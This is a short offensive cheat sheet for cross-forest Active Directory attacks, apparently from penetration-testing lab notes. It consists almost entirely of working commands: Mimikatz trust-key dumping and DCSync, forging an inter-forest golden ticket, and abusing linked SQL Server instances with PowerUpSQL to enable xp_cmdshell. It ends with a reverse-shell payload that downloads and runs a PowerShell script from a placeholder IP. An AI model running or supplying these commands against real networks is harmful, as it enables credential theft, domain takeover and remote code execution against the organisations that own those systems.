# Cross Forest Attacks

### Trust flow

## **Dump trust keys**

Look for in trust key from child to parent (first command) Look for NTLM hash (second command)

```
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computername <computername>
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
```

## **Create a intern-forest TGT**

```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<domain> /sid:<domain sid> /rc4:<hash of trust> /service:krbtgt /target:<target> /ticket:<path to save ticket>"'
```

## **Create a TGS for a service (kekeo\_old)**

```
./asktgs.exe <kirbi file> CIFS/<crossforest dc name>
```

## **Use the TGT**

```
./kirbikator.exe lsa <kirbi file>
```

## **Check access to server**

```
ls \\<servername>\<share>\
```

## Trust abuse SQL

```
. .\PowerUpSQL.ps1
```

## **Discovery SPN scanning**

```
Get-SQLInstanceDomain
```

## **Check accessibility**

```
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded – Verbose
```

## **Gather information**

```
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

## **Search for links to remote servers**

```
Get-SQLServerLink -Instance <sql instance> -Verbose
```

## **Enumerate database links**

```
Get-SQLServerLinkCrawl -Instance <sql instance> -Verbose
```

## **Enable xp\_cmdshell**

```
Execute(‘sp_configure “xp_cmdshell”,1;reconfigure;’) AT “<sql instance>”
```

## **Execute commands**

```
Get-SQLServerLinkCrawl -Instance <sql instance> -Query "exec master..xp_cmdshell 'whoami'"
```

## **Execute reverse shell example**

```
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'Powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000'"
```
